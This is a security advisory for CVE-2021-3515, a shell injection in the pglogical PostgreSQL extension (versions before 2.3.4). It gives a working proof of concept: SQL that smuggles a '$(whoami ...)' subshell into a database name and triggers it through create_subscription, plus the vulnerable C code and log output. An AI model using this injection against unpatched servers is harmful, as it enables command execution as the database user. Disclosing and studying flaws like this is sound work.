---
title: '2ndQuadrant: pglogical pg_dump/pg_restore remote code execution'
severity: Moderate
ghsa_id: GHSA-wcv2-vxw9-23hx
cve_id: CVE-2021-3515
weaknesses: []
products:
- ecosystem: ''
  package_name: pglogical
  affected_versions: <2.3.4
  patched_versions: 2.3.4
cvss: null
credits: []
---

### Summary
Shell injection vulnerability when creating a subscription that utilizes synchronize_structure when calling pglogical.create_subscription. The underlying vulnerability is the database name is used in a string value that is passed to a call to system without any sanitization at https://github.com/2ndQuadrant/pglogical/blob/451d5a5cc8b8bacb50fd6c55bbbd896ebbdc619f/pglogical_sync.c#L120 and 
https://github.com/2ndQuadrant/pglogical/blob/451d5a5cc8b8bacb50fd6c55bbbd896ebbdc619f/pglogical_sync.c#L152.

### Severity
**Medium**
A user that was granted USAGE on the pglogical schema would be able to execute shell commands as the user running postgresql.

A scenario where an unprivileged user could be granted USAGE on pglogical schema for arbitrary databases could be in migrating between database providers. 

### Proof of Concept
#### Setup

This setup contains 2 VMs both running Postgresql-11. I have built pglogical 2.3.3 from source. 

Both instances follow the "Quick Setup" guide:
```
wal_level = 'logical'
max_worker_processes = 10   # one per database needed on provider node
                            # one per node needed on subscriber node
max_replication_slots = 10  # one per node needed on provider node
max_wal_senders = 10        # one per node needed on provider node
shared_preload_libraries = 'pglogical'
```

I've enabled the instances to talk to the network
```
listen_addresses = '*' 
```
With the following addition to pg_hba.conf 
```
host    all             all             all                     md5
```
#### Reproduction 
For the initial setup we'll be using the Superuser postgres 
```sql
ALTER USER postgres WITH PASSWORD <pass>
```
Both will create a database that contains the payload to execute we'll use a simple example of writing to a file in /tmp
```sql
CREATE DATABASE "$(whoami > /tmp/whoami.txt)";
```
Enable pglogical in the newly created database on both
```sql
\c "$(whoami > /tmp/whoami.txt)"
CREATE EXTENSION pglogical;
```
On the subscriber side we'll create a new user and grant them usage on pglogical
```sql
CREATE USER test_user WITH PASSWORD <pass>;
GRANT USAGE on SCHEMA pglogical TO test_user;
```
Setup the provider node on the provider instance
```sql
SELECT pglogical.create_node(node_name := 'test_provider',
    dsn := $$host=<provider_ip> port=<provider_port> user=postgres password=<pass> dbname='$(whoami > /tmp/whoami.txt)'$$);
```
On the subscribe instance setup the node
```sql
SELECT pglogical.create_node(
    node_name := 'test_sub',
    dsn := $$host=<sub_ip> port=<sub_port> user=test_user password=<pass> dbname='$(whoami > /tmp/whoami.txt)'$$);
```
Create a subscription, ensuring you set `synchronize_structure := TRUE` which will hit the vulnerable path. 

To trigger the vulnerability at pglogical_sync.c:120 include the payload in the subscription’s dbname. To trigger the one at pglogical_sync.c:152 use a normal dbname. 
```sql
-- Will Trigger shell injection at pglogical_sync.c:120
SELECT pglogical.create_subscription(subscription_name := 'test_sub',
    provider_dsn := $$host=<provier_ip> port=<provider_port> user=postgres password=<pass> dbname='$(whoami > /tmp/whoami.txt)'$$,
    synchronize_structure := TRUE);

-- Will trigger the shell injection at pglogical_sync.c:152
SELECT pglogical.create_subscription(subscription_name := 'test_sub',
    provider_dsn := $$host=<provier_ip> port=<provider_port> user=postgres password=<pass> dbname=postgres'$$,
    synchronize_structure := TRUE);
```
The command should execute. We can confirm this by looking for the file. 
```
$ cat /tmp/whoami.txt 
postgres
```
### Further Analysis
When syncing occurs we see that dump_structure is executed if the sync type is structure or full. We satisfy this requirement when setting syncronize_structure to TRUE when creating a subscription.

[pglogical_sync.c:810](https://github.com/2ndQuadrant/pglogical/blob/451d5a5cc8b8bacb50fd6c55bbbd896ebbdc619f/pglogical_sync.c#L810)
```c
if (SyncKindStructure(sync->kind))
				{
    ...snip...
					/* Dump structure to temp storage. */
					dump_structure(sub, tmpfile, snapshot);
```
Within dump_structure the user provided dsn is used to craft a string that will
be passed to system

[pglogical_sync.c:116](https://github.com/2ndQuadrant/pglogical/blob/451d5a5cc8b8bacb50fd6c55bbbd896ebbdc619f/pglogical_sync.c#L116)
```c
	appendStringInfo(&command, "\"%s\" --snapshot=\"%s\" %s -s -F c -f \"%s\" \"%s\"",
					 pg_dump, snapshot, schema_filter.data, destfile,
					 sub->origin_if->dsn);

	res = system(command.data);
```
Looking at the logs we can see what was executed

/var/log/postgresql/postgresql-11-main.log
```
2021-02-05 18:35:43.233 UTC [26568] [unknown]@$(whoami > /tmp/whoami.txt) ERROR:
could not execute command ""/usr/lib/postgresql/11/bin/pg_dump"
--snapshot="0000000E-0000000D-1" -N pglogical -s -F c -f
"/tmp/pglogical-26568.dump" "host=10.128.0.49 port=5432 user=postgres password=a0de0238d8d4277c8efb97221972d48d359231c45152c73a1b24021520c15d69 dbname='$(whoami > /tmp/whoami.txt)'""
```

Our subshell is still executed even though it's in single quotes, because it's wrapped in double quotes. 

Similar to dump_structure, restore_structure has the same vulnerable pattern. 

[pglogical_sync.c:148](https://github.com/2ndQuadrant/pglogical/blob/451d5a5cc8b8bacb50fd6c55bbbd896ebbdc619f/pglogical_sync.c#L148)
```c
	appendStringInfo(&command,
					 "\"%s\" --section=\"%s\" --exit-on-error -1 -d \"%s\" \"%s\"",
					 pg_restore, section, sub->target_if->dsn, srcfile);
```
/var/log/postgresql/postgresql-11-main.log
```
2021-02-08 21:59:45.544 UTC [21153] [unknown]@$(whoami > /tmp/whoami.txt) ERROR:  could not execute command ""/usr/lib/postgresql/11/bin/pg_restore" --section=
"pre-data" --exit-on-error -1 -d "host=10.128.15.199 port=5432 user=test_user password=64eca3f8451089e4711b9fe0c6c24d264cfa11ff24c88f0f52067e5f223e140c dbname='$(whoami > /tmp/whoami.txt)'" "/tmp/pglogical-21153.dump"
```

### Timeline
**Date reported**: 2021-03-08
**Date fixed**: 2021-05-23
**Date disclosed**: 2021-06-07

### Credits
Pedro Gallegos